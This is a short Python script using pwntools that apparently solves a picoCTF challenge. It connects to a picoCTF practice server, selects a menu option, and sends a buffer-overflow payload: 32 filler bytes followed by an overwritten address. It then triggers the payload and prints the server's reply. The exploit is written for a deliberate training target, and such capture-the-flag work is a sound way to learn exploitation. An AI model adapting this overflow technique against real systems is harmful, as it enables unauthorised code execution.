from pwn import *

# Connect to the remote server
p = remote("mimas.picoctf.net", 60764)

# Start the local process
#p = process("./chall")

# Send option 2 to interact with the buffer
p.sendline(b"2")
p.recvuntil(b"buffer:")

# Send the payload to overflow the buffer and overwrite the return address
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00"
p.sendline(payload)

# Wait for the menu and send option 4 to trigger the payload
p.recvuntil(b"choice:")
p.sendline(b"4")

# Print the output from the server
print(p.recvall())

